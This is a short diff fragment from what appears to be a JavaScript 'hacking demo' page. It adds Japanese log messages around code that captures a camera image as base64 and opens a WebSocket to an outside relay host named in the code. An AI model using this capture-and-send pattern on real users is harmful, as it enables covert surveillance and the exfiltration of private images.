@@ -22,7 +22,9 @@
           .catch(err => console.error('Error: ', err));
       }
       function main() {
+        console.log("カメラを起動しました");
         captureImage((base64Image) => {
+          console.log("送信を開始しました");
           const socket = new WebSocket('wss://cloud.achex.ca/hackingdemo');
           socket.addEventListener('open', function (event) {
             console.log('open',event)
